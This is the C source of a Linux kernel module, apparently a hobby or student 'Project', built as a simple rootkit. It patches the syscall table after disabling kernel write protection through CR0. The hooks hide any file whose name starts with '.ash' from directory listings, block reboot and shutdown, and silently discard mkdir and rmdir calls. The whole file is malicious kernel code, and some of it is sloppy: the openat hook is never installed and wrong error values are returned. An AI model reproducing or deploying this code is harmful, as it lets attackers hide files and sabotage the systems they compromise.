#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>

#define enable_reboot 0
#define enable_shutdown 0
#define HIDE_PREFIX ".ash"
#define HIDE_PREFIX_SZ (sizeof(HIDE_PREFIX) - 1)

MODULE_LICENSE("GPL");
MODULE_VERSION("0.01");

static unsigned long * sys_call_addr;
asmlinkage int (*old_reboot_sys_call)(int,int,int,void*);
typedef asmlinkage long (*orig_shutdown_t)(int, int);
typedef asmlinkage long (*orig_rmdir_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_mkdir_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_openat_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
orig_getdents_t orig_getdents;
orig_rmdir_t orig_rmdir;
orig_mkdir_t orig_mkdir;
orig_openat_t orig_openat;
orig_shutdown_t orig_shutdown;


struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};

asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	int boff;
	struct linux_dirent* ent;
	long ret = orig_getdents(fd, dirent, count);
	char* dbuf;
	if (ret <= 0) {
		return ret;
	}
	dbuf = (char*)dirent;
	// go through the entries, looking for one that has our prefix
	for (boff = 0; boff < ret;) {
		ent = (struct linux_dirent*)(dbuf + boff);

		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0)) {     // or if it has the module name anywhere in it
			// remove this entry by copying everything after it forward
			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
			// and adjust the length reported
			ret -= ent->d_reclen;
		} else {
			// on to the next entry
			boff += ent->d_reclen;
		}
	}
	return ret;
}

asmlinkage int hackers_reboot(int magic1,int magic2,int magic3, void* arg)
{
    if(enable_reboot)
    {
        return old_reboot_sys_call(magic1,magic2,magic3,arg);
    }
    printk("Project: Blocked Reboot Call\n");
    return EPERM;
}
asmlinkage int my_openat(const struct pt_regs *regs){
	const char __user *filename = (char *)regs->si;
    printk("Project:a check");
    char dir_name[100] = {0};
    strncpy_from_user(dir_name, filename, 100);
     printk("Project:Trying to access file with path: %s\n", dir_name);
     orig_openat(regs);
    return 0;
}


asmlinkage int my_shutdown(int para1, int para2) {
    if(enable_shutdown)
    {
        return orig_shutdown(para1,para2);
    }
    printk("Project: Blocked Shutdown Call\n");
    return EPERM;
}

asmlinkage int my_rmdir(const struct pt_regs *regs)
{
    char __user *filename = (char *)regs->di;
    char dir_name[100] = {0};
    strncpy_from_user(dir_name, filename, 100);
    printk("Project:Trying to delete directory with name: %s\n", dir_name);
    //orig_rmdir(regs);
    return 0;
}
asmlinkage int my_mkdir(const struct pt_regs *regs)
{
    char __user *filename = (char *)regs->di;
    char dir_name[100] = {0};
    strncpy_from_user(dir_name, filename, 100);
    printk("Project:Trying to make directory with name: %s\n", dir_name);
    //orig_mkdir(regs);
    return 0;
}

inline void my_cr0(unsigned long cr0)
{
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

static inline void protect_memory(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    my_cr0(cr0);
}

static inline void unprotect_memory(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    my_cr0(cr0);
}

static int __init start(void)
{
    sys_call_addr = kallsyms_lookup_name("sys_call_table");

    orig_rmdir = (orig_rmdir_t)sys_call_addr[__NR_rmdir];
    orig_shutdown = (orig_shutdown_t)sys_call_addr[__NR_shutdown];
    orig_mkdir=(orig_mkdir_t)sys_call_addr[__NR_mkdir];
    old_reboot_sys_call=sys_call_addr[__NR_reboot];
    orig_getdents = (orig_getdents_t)sys_call_addr[__NR_getdents];
    printk("Project:Module: Loaded \n");
    printk("Project:rmdir @ 0x%lx\n", orig_rmdir);
    printk("Project:rmdir @ 0x%lx\n", orig_mkdir);
    printk("Project:shutdown @ 0x%lx\n", orig_shutdown);
    printk("Project:reboot @ 0x%lx\n", old_reboot_sys_call);

    unprotect_memory();
    

    printk("hooked all syscall\n");
    sys_call_addr[__NR_reboot] = (unsigned long) hackers_reboot;
    sys_call_addr[__NR_rmdir] = (unsigned long)my_rmdir;
    sys_call_addr[__NR_mkdir] = (unsigned long)my_mkdir;
    sys_call_addr[__NR_shutdown] = (unsigned long)my_shutdown;
    sys_call_addr[__NR_getdents] = (unsigned long)sys_getdents_new;
    protect_memory();

    return 0;
}

static void __exit end(void)
{
    unprotect_memory();
    
    printk("Project:restoring all syscall\n");
    sys_call_addr[__NR_rmdir] = (unsigned long)orig_rmdir;
    sys_call_addr[__NR_mkdir] = (unsigned long)orig_mkdir;
    sys_call_addr[__NR_shutdown]=(unsigned long)orig_shutdown;
    sys_call_addr[__NR_reboot]=(unsigned long)old_reboot_sys_call;
    sys_call_addr[__NR_getdents]=(unsigned long)orig_getdents;
    protect_memory();
    
    printk("Project:Unloaded \n");
}

module_init(start);
module_exit(end);

